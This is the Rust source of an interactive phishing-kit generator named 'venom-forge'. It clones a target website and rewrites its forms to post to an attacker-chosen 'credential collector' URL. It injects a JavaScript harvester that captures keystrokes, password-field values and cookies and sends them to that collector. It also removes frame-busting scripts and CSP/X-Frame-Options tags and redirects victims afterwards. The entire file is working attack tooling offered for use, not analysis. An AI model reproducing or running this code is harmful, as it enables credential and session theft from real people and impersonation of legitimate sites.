// venom-forge — phishing site cloner
// interactive menu wrapper over full clone/inject engine

use base64::{engine::general_purpose::STANDARD as B64, Engine};
use bytes::Bytes;
use chrono::Local;
use colored::*;
use console::Term;
use dialoguer::{theme::ColorfulTheme, Confirm, Input, Select};
use indicatif::{ProgressBar, ProgressStyle};
use regex::Regex;
use reqwest::blocking::{Client, ClientBuilder};
use reqwest::header::{HeaderMap, HeaderValue, ACCEPT, ACCEPT_LANGUAGE, USER_AGENT};
use serde_json;
use std::collections::HashMap;
use std::fs;
use std::path::Path;
use std::time::Duration;
use url::Url;
use scraper::{Html, Selector};

// ─── Theme ──────────────────────────────────────────────────────────────────

fn theme() -> ColorfulTheme {
    ColorfulTheme::default()
}

// ─── Config built from menu ──────────────────────────────────────────────────

#[derive(Debug)]
struct Config {
    url:             String,
    output:          String,
    collector:       String,
    redirect:        String,
    inline:          bool,
    keylogger:       bool,
    strip_busters:   bool,
    follow_redirects: bool,
    ua:              String,
}

// ─── Asset structs ───────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq)]
enum AssetKind { Css, Js, Image, Font, Other }

#[derive(Debug, Clone)]
struct Asset {
    url:      String,
    kind:     AssetKind,
    local:    String,
    data:     Option<Bytes>,
    b64_mime: Option<String>,
}

// ─── Banner ──────────────────────────────────────────────────────────────────
fn banner() {
    // VENOM ASCII ART
    let art = r#"
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢈⠀⠀⠀⢀⢈⣈⣌⣌⣌⣌⣌⢈⢈⠀⠀⠀⢈⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢈⣌⣾⣿⣿⣎⢙⡳⣷⣿⣿⣿⣿⣿⣿⣿⠷⢓⣬⣾⣿⣯⣎⢌⠈⠀⠀⠀
⢀⣾⣿⡱⣷⣿⣿⣿⣿⣯⣎⣝⣻⣿⣿⢿⣛⣌⣮⣿⣿⣿⣿⣿⠗⣹⣿⢌⠀⠀
⣾⣿⣿⠯⠀⠱⣷⣿⣯⠙⡳⣷⣿⣿⣿⣿⣿⡷⠓⣭⣿⣿⠷⠁⢲⡿⣿⣿⠎⠀
⠓⢁⠞⣿⠌⠀⣎⠹⣷⣿⣎⣌⣹⣿⣿⢿⣉⣬⣾⡿⢷⣭⠂⢀⣾⠇⢌⠱⠃⠀
⣨⡿⠀⠰⣷⣎⢘⠙⠀⠑⢑⣿⣿⣿⣿⣿⣿⠝⠑⠀⠑⢙⣈⣾⠗⠀⣱⣯⠀⠀
⣱⢏⠀⠀⠀⠑⠳⡷⣯⣎⣼⢞⣳⣿⣿⡿⣉⢿⣌⣾⡿⠷⠓⠁⢀⠀⣰⣿⠀⠀
⠀⡳⢎⠰⢎⠀⠀⠀⣀⠙⠳⡷⡿⡷⡷⡷⡷⠷⢓⠉⠀⠀⠀⣀⠆⣈⡾⠃⠀⠀
⠀⠀⠐⡣⢼⣯⠈⠀⠐⣿⠀⣆⠀⠀⠀⠀⣀⠀⣷⠏⠀⢀⣬⣛⡾⠓⠀⠀⠀⠀
⠀⠀⠀⠀⠐⡳⣿⠌⠀⣷⠀⠰⠀⠀⠀⠀⠐⠀⣾⠁⢀⣾⡿⠓⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡱⣿⠌⠰⠏⠀⠀⠀⠀⠀⠀⢀⠗⠀⣼⠿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣱⣏⠌⠠⠀⠀⠀⠀⠀⠀⠐⣀⣠⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣏⠀⠈⠀⠀⠀⠀⠀⠀⣰⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠀⣏⢀⠀⠀⢀⣠⠆⣼⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣏⠘⠳⡆⡄⠲⠓⣨⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈
"#;

    // Red fade ASCII art
    for (i, line) in art.lines().enumerate() {
        if i % 3 == 0 {
            println!("\x1b[38;2;120;0;0m{}\x1b[0m", line);
        } else if i % 3 == 1 {
            println!("\x1b[38;2;200;0;0m{}\x1b[0m", line);
        } else {
            println!("\x1b[38;2;255;40;40m{}\x1b[0m", line);
        }
    }

    // VENOM — red gradient mix
    println!();
    let colors = [
        (255, 0, 0),
        (210, 0, 0),
        (160, 0, 0),
        (210, 0, 0),
        (255, 35, 35),
    ];

    print!("          ");
    for (ch, (r, g, b)) in "VENOM".chars().zip(colors.iter()) {
        print!("\x1b[1;38;2;{};{};{}m{}\x1b[0m", r, g, b, ch);
    }
    println!("\n");
}
// ─── Menu ────────────────────────────────────────────────────────────────────

fn main_menu() -> Config {
    let term = Term::stdout();
    term.clear_screen().ok();
    banner();

    println!("{}", "  Setup Wizard — press Enter to confirm each step\n".dimmed());

    // ── Target URL ───────────────────────────────────────────────────────
    let url: String = Input::with_theme(&theme())
        .with_prompt(format!("{}", "🎯 Target URL to clone".cyan()))
        .with_initial_text("https://")
        .validate_with(|s: &String| {
            if Url::parse(s).is_ok() { Ok(()) }
            else { Err("valid URL enter karanna (https://...)") }
        })
        .interact_text()
        .unwrap();

    // ── Output dir ───────────────────────────────────────────────────────
    let default_out = {
        let host = Url::parse(&url)
            .ok()
            .and_then(|u| u.host_str().map(|h| h.replace('.', "_")))
            .unwrap_or_else(|| "cloned".to_string());
        format!("forge_{}", host)
    };

    let output: String = Input::with_theme(&theme())
        .with_prompt(format!("{}", "📁 Output directory".cyan()))
        .default(default_out)
        .interact_text()
        .unwrap();

    // ── Collector ────────────────────────────────────────────────────────
    let collector: String = Input::with_theme(&theme())
        .with_prompt(format!("{}", "📡 Credential collector URL (your server/catch endpoint)".cyan()))
        .with_initial_text("https://")
        .validate_with(|s: &String| {
            if Url::parse(s).is_ok() { Ok(()) }
            else { Err("valid URL enter karanna") }
        })
        .interact_text()
        .unwrap();

    // ── Redirect after capture ───────────────────────────────────────────
    let want_redirect = Confirm::with_theme(&theme())
        .with_prompt("↪  Victim capture wela paassase redirect karannada?")
        .default(true)
        .interact()
        .unwrap();

    let redirect = if want_redirect {
        Input::with_theme(&theme())
            .with_prompt(format!("{}", "   Redirect URL".cyan()))
            .with_initial_text(&url)
            .interact_text()
            .unwrap()
    } else {
        String::new()
    };

    // ── Mode ─────────────────────────────────────────────────────────────
    println!();
    let mode_idx = Select::with_theme(&theme())
        .with_prompt(format!("{}", "📦 Output mode".cyan()))
        .items(&[
            "Standard  — folder with HTML + assets (nginx/apache serve)",
            "Inline    — single self-contained HTML file (portable)",
        ])
        .default(0)
        .interact()
        .unwrap();
    let inline = mode_idx == 1;

    // ── Options ──────────────────────────────────────────────────────────
    println!();
    println!("{}", "  Options:".dimmed());

    let keylogger = Confirm::with_theme(&theme())
        .with_prompt("⌨  JS keylogger inject karannada? (autofill + form capture)")
        .default(true)
        .interact()
        .unwrap();

    let strip_busters = Confirm::with_theme(&theme())
        .with_prompt("🛡  Frame buster scripts strip karannada?")
        .default(true)
        .interact()
        .unwrap();

    let follow_redirects = Confirm::with_theme(&theme())
        .with_prompt("🔗  Target redirects follow karannada?")
        .default(true)
        .interact()
        .unwrap();

    // ── UA ───────────────────────────────────────────────────────────────
    println!();
    let ua_idx = Select::with_theme(&theme())
        .with_prompt(format!("{}", "🌐 User-Agent".cyan()))
        .items(&[
            "Chrome 124 Windows (default)",
            "Chrome 124 macOS",
            "Firefox 125 Windows",
            "Safari 17 macOS",
            "Custom",
        ])
        .default(0)
        .interact()
        .unwrap();

    let ua = match ua_idx {
        0 => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36".to_string(),
        1 => "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36".to_string(),
        2 => "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0".to_string(),
        3 => "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15".to_string(),
        _ => Input::with_theme(&theme())
                .with_prompt("Custom UA")
                .interact_text()
                .unwrap(),
    };

    // ── Summary + confirm ─────────────────────────────────────────────────
    println!();
    println!("{}", "─".repeat(55).dimmed());
    println!("{}", "  Summary".bold());
    println!("{} {}", "  Target    :".yellow(), url.green());
    println!("{} {}", "  Output    :".yellow(), output.green());
    println!("{} {}", "  Collector :".yellow(), collector.green());
    println!("{} {}", "  Redirect  :".yellow(), if redirect.is_empty() { "(none)".to_string() } else { redirect.clone() }.green());
    println!("{} {}", "  Mode      :".yellow(), if inline { "inline" } else { "standard" }.green());
    println!("{} {}", "  Keylogger :".yellow(), keylogger.to_string().green());
    println!("{} {}", "  Busters   :".yellow(), strip_busters.to_string().green());
    println!("{}", "─".repeat(55).dimmed());
    println!();

    let go = Confirm::with_theme(&theme())
        .with_prompt(format!("{}", "🐍 Clone start karannada?".red().bold()))
        .default(true)
        .interact()
        .unwrap();

    if !go {
        println!("{}", "Aborted.".dimmed());
        std::process::exit(0);
    }

    Config { url, output, collector, redirect, inline, keylogger, strip_busters, follow_redirects, ua }
}

// ─── Core engine (same as before) ────────────────────────────────────────────

fn harvester_script(collector: &str, redirect: &str) -> String {
    let redir_js = if redirect.is_empty() {
        String::new()
    } else {
        format!("setTimeout(function(){{ window.location.href='{}'; }}, 800);", redirect)
    };
    format!(
        r#"<script id="__vf__">
(function(){{
  var _live={{}};
  document.addEventListener('input',function(e){{
    var el=e.target;if(!el||!el.name)return;
    _live[el.name]=el.value;
  }},true);
  function interceptForm(form){{
    form.addEventListener('submit',function(ev){{
      var fd=new FormData(form),obj={{}};
      fd.forEach(function(v,k){{obj[k]=v;}});
      Object.assign(obj,_live);
      obj['__url__']=window.location.href;
      obj['__ua__']=navigator.userAgent;
      obj['__ts__']=new Date().toISOString();
      var x=new XMLHttpRequest();
      x.open('POST','{}',true);
      x.setRequestHeader('Content-Type','application/json');
      x.setRequestHeader('X-VF','1');
      x.send(JSON.stringify(obj));
      if(document.cookie){{
        var c=new XMLHttpRequest();
        c.open('POST','{}',true);
        c.setRequestHeader('Content-Type','application/json');
        c.send(JSON.stringify({{__type__:'cookie',__c__:document.cookie,__url__:location.href}}));
      }}
      {}
    }},false);
  }}
  Array.from(document.forms).forEach(interceptForm);
  var obs=new MutationObserver(function(m){{
    m.forEach(function(mt){{
      mt.addedNodes.forEach(function(n){{
        if(n.tagName==='FORM')interceptForm(n);
        if(n.querySelectorAll)n.querySelectorAll('form').forEach(interceptForm);
      }});
    }});
  }});
  obs.observe(document.body||document.documentElement,{{childList:true,subtree:true}});
  setInterval(function(){{
    document.querySelectorAll('input[type=password]').forEach(function(f){{
      if(f.value&&f.value!==f.__vf__){{f.__vf__=f.value;_live[f.name||'__pw__']=f.value;}}
    }});
  }},500);
  if(document.cookie){{
    var cx=new XMLHttpRequest();
    cx.open('POST','{}',true);
    cx.setRequestHeader('Content-Type','application/json');
    cx.send(JSON.stringify({{__type__:'cookie_load',__c__:document.cookie,__url__:location.href}}));
  }}
}})();
</script>"#,
        collector, collector, redir_js, collector
    )
}

fn strip_framebusters(js: &str) -> String {
    let patterns = [
        (r"if\s*\(\s*(?:window\.)?top\s*[!=]=+\s*(?:window\.)?(?:self|window)\s*\)", "if(false)"),
        (r"if\s*\(\s*(?:window\.)?self\s*[!=]=+\s*(?:window\.)?top\s*\)",             "if(false)"),
        (r#"(?:window\.)?top\.location(?:\.href)?\s*=\s*(?:window\.)?(?:self\.)?location(?:\.href)?"#, "void(0)"),
        (r#"(?:window\.)?location\.href\s*=\s*(?:window\.)?top\.location(?:\.href)?"#, "void(0)"),
    ];
    let mut out = js.to_string();
    for (pat, repl) in &patterns {
        if let Ok(re) = Regex::new(pat) {
            out = re.replace_all(&out, *repl).to_string();
        }
    }
    out
}

fn build_client(ua: &str, follow: bool) -> Client {
    let mut headers = HeaderMap::new();
    headers.insert(USER_AGENT,      HeaderValue::from_str(ua).unwrap());
    headers.insert(ACCEPT,          HeaderValue::from_static("text/html,application/xhtml+xml,*/*;q=0.8"));
    headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static("en-US,en;q=0.9"));
    ClientBuilder::new()
        .default_headers(headers)
        .timeout(Duration::from_secs(30))
        .danger_accept_invalid_certs(true)
        .redirect(if follow { reqwest::redirect::Policy::limited(10) } else { reqwest::redirect::Policy::none() })
        .cookie_store(true)
        .gzip(true)
        .build()
        .unwrap()
}

fn resolve(base: &Url, href: &str) -> Option<Url> {
    let h = href.trim();
    if h.is_empty() || h.starts_with("data:") || h.starts_with("javascript:") || h.starts_with('#') { return None; }
    base.join(h).ok()
}

fn md5_hash(s: &str) -> u64 {
    use std::collections::hash_map::DefaultHasher;
    use std::hash::{Hash, Hasher};
    let mut h = DefaultHasher::new();
    s.hash(&mut h);
    h.finish()
}

fn url_to_local(url: &Url, kind: &AssetKind) -> String {
    let fname = Path::new(url.path())
        .file_name().and_then(|f| f.to_str()).unwrap_or("file").to_string();
    let ext = match kind {
        AssetKind::Css => ".css", AssetKind::Js => ".js", _ => "",
    };
    let hash = format!("{:x}", md5_hash(url.as_str()));
    if fname.contains('.') { format!("assets/{}_{}", hash, fname) }
    else                   { format!("assets/{}_{}{}", hash, fname, ext) }
}

fn kind_from(url: &Url, ct: &str) -> AssetKind {
    let p = url.path().to_lowercase(); let c = ct.to_lowercase();
    if p.ends_with(".css") || c.contains("text/css")       { AssetKind::Css   }
    else if p.ends_with(".js") || c.contains("javascript") { AssetKind::Js    }
    else if p.ends_with(".woff") || p.ends_with(".woff2")
         || p.ends_with(".ttf") || c.contains("font")      { AssetKind::Font  }
    else if c.contains("image") || p.ends_with(".png")
         || p.ends_with(".jpg") || p.ends_with(".jpeg")
         || p.ends_with(".gif") || p.ends_with(".svg")
         || p.ends_with(".ico") || p.ends_with(".webp")    { AssetKind::Image }
    else                                                    { AssetKind::Other }
}

fn mime_for(url: &Url) -> &'static str {
    let p = url.path().to_lowercase();
    if p.ends_with(".png")         { "image/png"   }
    else if p.ends_with(".jpg") || p.ends_with(".jpeg") { "image/jpeg" }
    else if p.ends_with(".gif")    { "image/gif"   }
    else if p.ends_with(".webp")   { "image/webp"  }
    else if p.ends_with(".svg")    { "image/svg+xml" }
    else if p.ends_with(".ico")    { "image/x-icon" }
    else if p.ends_with(".woff")   { "font/woff"   }
    else if p.ends_with(".woff2")  { "font/woff2"  }
    else if p.ends_with(".ttf")    { "font/ttf"    }
    else                           { "application/octet-stream" }
}

fn collect_assets(html: &Html, base: &Url) -> Vec<(String, AssetKind)> {
    let mut out = Vec::new();
    let re_url  = Regex::new(r#"url\(['"]?([^'")\s]+)['"]?\)"#).unwrap();

    macro_rules! grab {
        ($sel:expr, $attr:expr, $kind:expr) => {
            if let Ok(s) = Selector::parse($sel) {
                for el in html.select(&s) {
                    if let Some(v) = el.value().attr($attr) {
                        if let Some(u) = resolve(base, v) { out.push((u.to_string(), $kind)); }
                    }
                }
            }
        }
    }

    grab!("link[rel='stylesheet']",     "href", AssetKind::Css);
    grab!("script[src]",                "src",  AssetKind::Js);
    grab!("img",                        "src",  AssetKind::Image);
    grab!("img",                        "data-src", AssetKind::Image);
    grab!("source",                     "src",  AssetKind::Image);
    grab!("link[rel='icon']",           "href", AssetKind::Image);
    grab!("link[rel='shortcut icon']",  "href", AssetKind::Image);
    grab!("link[rel='apple-touch-icon']","href",AssetKind::Image);

    if let Ok(s) = Selector::parse("[style]") {
        for el in html.select(&s) {
            if let Some(style) = el.value().attr("style") {
                for cap in re_url.captures_iter(style) {
                    if let Some(u) = resolve(base, &cap[1]) { out.push((u.to_string(), AssetKind::Image)); }
                }
            }
        }
    }

    out.dedup_by(|a, b| a.0 == b.0);
    out
}

fn rewrite_html(html: &str, asset_map: &HashMap<String, String>, cfg: &Config) -> String {
    let mut out = html.to_string();

    for (orig, local) in asset_map {
        out = out.replace(orig.as_str(), local.as_str());
    }

    if cfg.strip_busters {
        let re_s = Regex::new(r"(?si)<script(?:[^>]*)>(.*?)</script>").unwrap();
        out = re_s.replace_all(&out, |caps: &regex::Captures| {
            let open  = &caps[0][..caps[0].find('>').unwrap_or(0) + 1];
            let inner = strip_framebusters(&caps[1]);
            format!("{}{}</script>", open, inner)
        }).to_string();
        let re_m = Regex::new(r#"(?i)<meta[^>]*http-equiv\s*=\s*["']?(?:content-security-policy|x-frame-options)["']?[^>]*/?>"#).unwrap();
        out = re_m.replace_all(&out, "").to_string();
    }

    // rewrite forms
    let re_f = Regex::new(r#"(?i)<form([^>]*)>"#).unwrap();
    out = re_f.replace_all(&out, |caps: &regex::Captures| {
        let attrs = &caps[1];
        let ra    = Regex::new(r#"(?i)\s*action\s*=\s*["'][^"']*["']"#).unwrap();
        let rm    = Regex::new(r#"(?i)\s*method\s*=\s*["'][^"']*["']"#).unwrap();
        let a2    = ra.replace_all(attrs, "").to_string();
        let a3    = rm.replace_all(&a2, "").to_string();
        format!("<form{} method=\"POST\" action=\"{}\" target=\"_self\">", a3, cfg.collector)
    }).to_string();

    // inject harvester
    let script = harvester_script(&cfg.collector, &cfg.redirect);
    if let Some(pos) = out.to_lowercase().rfind("</body>") {
        out.insert_str(pos, &script);
    } else {
        out.push_str(&script);
    }

    let re_csp = Regex::new(r#"(?i)<meta[^>]*content-security-policy[^>]*>"#).unwrap();
    out = re_csp.replace_all(&out, "").to_string();

    out
}

fn inline_assets(html: &str, assets: &HashMap<String, Asset>, asset_map: &HashMap<String, String>) -> String {
    let mut out = html.to_string();
    for (orig_url, asset) in assets {
        let Some(data) = &asset.data else { continue };
        match asset.kind {
            AssetKind::Image | AssetKind::Font => {
                let mime = asset.b64_mime.as_deref().unwrap_or("application/octet-stream");
                let uri  = format!("data:{};base64,{}", mime, B64.encode(data));
                out = out.replace(orig_url.as_str(), &uri);
                if let Some(local) = asset_map.get(orig_url) { out = out.replace(local.as_str(), &uri); }
            }
            AssetKind::Css => {
                let css = String::from_utf8_lossy(data).to_string();
                let tag = format!("<style>{}</style>", css);
                let re  = Regex::new(&format!(r#"(?i)<link[^>]*href\s*=\s*["']{}["'][^>]*/?>"#, regex::escape(orig_url)));
                if let Ok(re) = re { out = re.replace(&out, tag.as_str()).to_string(); }
            }
            AssetKind::Js => {
                let js  = String::from_utf8_lossy(data).to_string();
                let tag = format!("<script>{}</script>", strip_framebusters(&js));
                let re  = Regex::new(&format!(r#"(?i)<script[^>]*src\s*=\s*["']{}["'][^>]*></script>"#, regex::escape(orig_url)));
                if let Ok(re) = re { out = re.replace(&out, tag.as_str()).to_string(); }
            }
            _ => {}
        }
    }
    out
}

fn write(outdir: &str, filename: &str, data: &[u8]) {
    let path = Path::new(outdir).join(filename);
    if let Some(p) = path.parent() { fs::create_dir_all(p).ok(); }
    fs::write(path, data).ok();
}

// ─── Run engine ──────────────────────────────────────────────────────────────

fn run(cfg: Config) {
    println!();
    println!("{}", "─".repeat(55).red());
    println!("{}", "🐍 Starting forge...".red().bold());
    println!("{}", "─".repeat(55).red());
    println!();

    let target = Url::parse(&cfg.url).expect("url parse failed");
    let client = build_client(&cfg.ua, cfg.follow_redirects);

    // fetch page
    print!("{}", "→ Fetching target page... ".cyan());
    let resp     = client.get(&cfg.url).send().expect("request failed");
    let final_url = Url::parse(resp.url().as_str()).unwrap_or(target.clone());
    let html_raw  = resp.text().expect("body read failed");
    println!("{} ({} bytes)", "✓".green(), html_raw.len());

    let document   = Html::parse_document(&html_raw);
    let asset_urls = collect_assets(&document, &final_url);
    println!("{} {} assets discovered", "→".cyan(), asset_urls.len());

    // fetch assets
    let pb = ProgressBar::new(asset_urls.len() as u64);
    pb.set_style(
        ProgressStyle::with_template("  {spinner:.red} [{bar:40.red/dark_gray}] {pos}/{len} {msg}")
            .unwrap()
    );

    let mut assets:    HashMap<String, Asset>  = HashMap::new();
    let mut asset_map: HashMap<String, String> = HashMap::new();

    for (url_str, kind) in &asset_urls {
        pb.set_message(url_str.chars().take(45).collect::<String>());
        let Ok(url) = Url::parse(url_str) else { pb.inc(1); continue };
        let local   = url_to_local(&url, kind);

        if let Ok(resp) = client.get(url.as_str()).send() {
            if resp.status().is_success() {
                let ct = resp.headers().get("content-type")
                    .and_then(|v| v.to_str().ok()).unwrap_or("").to_string();
                let ak = kind_from(&url, &ct);
                let bm = Some(mime_for(&url).to_string());
                if let Ok(bytes) = resp.bytes() {
                    asset_map.insert(url_str.clone(), local.clone());
                    assets.insert(url_str.clone(), Asset {
                        url: url_str.clone(), kind: ak, local, data: Some(bytes), b64_mime: bm,
                    });
                }
            }
        }
        pb.inc(1);
    }
    pb.finish_and_clear();
    println!("{} {} assets fetched", "✓".green(), assets.len());

    // rewrite + inject
    print!("{}", "→ Rewriting HTML + injecting payload... ".cyan());
    let final_html = if cfg.inline {
        let inlined = inline_assets(&html_raw, &assets, &asset_map);
        rewrite_html(&inlined, &HashMap::new(), &cfg)
    } else {
        rewrite_html(&html_raw, &asset_map, &cfg)
    };
    println!("{}", "✓".green());

    // write output
    fs::create_dir_all(&cfg.output).ok();
    fs::create_dir_all(Path::new(&cfg.output).join("assets")).ok();

    if !cfg.inline {
        for (orig_url, asset) in &assets {
            let Some(data) = &asset.data else { continue };
            let write_data: Vec<u8> = if asset.kind == AssetKind::Js && cfg.strip_busters {
                strip_framebusters(&String::from_utf8_lossy(data)).into_bytes()
            } else {
                data.to_vec()
            };
            write(&cfg.output, &asset.local, &write_data);
        }
    }

    write(&cfg.output, "index.html", final_html.as_bytes());

    let manifest = serde_json::json!({
        "ts":        Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        "target":    cfg.url,
        "collector": cfg.collector,
        "redirect":  cfg.redirect,
        "assets":    assets.len(),
        "inline":    cfg.inline,
    });
    write(&cfg.output, "venom_manifest.json", manifest.to_string().as_bytes());

    // done
    println!();
    println!("{}", "─".repeat(55).red());
    println!("{}", "  ✓ FORGE COMPLETE".green().bold());
    println!("{} {}/index.html",       "  Output    :".yellow(), cfg.output);
    if !cfg.inline {
    println!("{} {}/assets/",          "  Assets    :".yellow(), cfg.output);
    }
    println!("{} {}/venom_manifest.json","  Manifest :".yellow(), cfg.output);
    println!("{}", "─".repeat(55).red());
    println!();
    println!("{}", "  Serve (Python):".dimmed());
    println!("    cd {} && python3 -m http.server 8080", cfg.output);
    println!();
    println!("{}", "  Credentials POST to:".dimmed());
    println!("    {}", cfg.collector.yellow());
    println!();
}

// ─── Entry ───────────────────────────────────────────────────────────────────

fn main() {
    let cfg = main_menu();
    run(cfg);
}
